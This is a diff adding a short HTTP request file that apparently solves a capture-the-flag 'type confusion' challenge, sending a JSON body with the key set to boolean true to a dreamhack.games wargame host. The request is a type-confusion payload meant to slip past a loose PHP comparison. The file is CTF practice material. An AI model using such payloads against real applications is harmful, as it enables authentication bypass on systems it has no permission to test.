@@ -1,0 +1,10 @@
+POST  http://host3.dreamhack.games:9258/index.php    HTTP/1.1
+Content-Type: application/json
+//Host: wargame.kr:8080
+//Referer: http://wargame.kr:8080/type_confusion
+//Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+//Content-Type: text/html
+
+{
+    "key" : true
+}
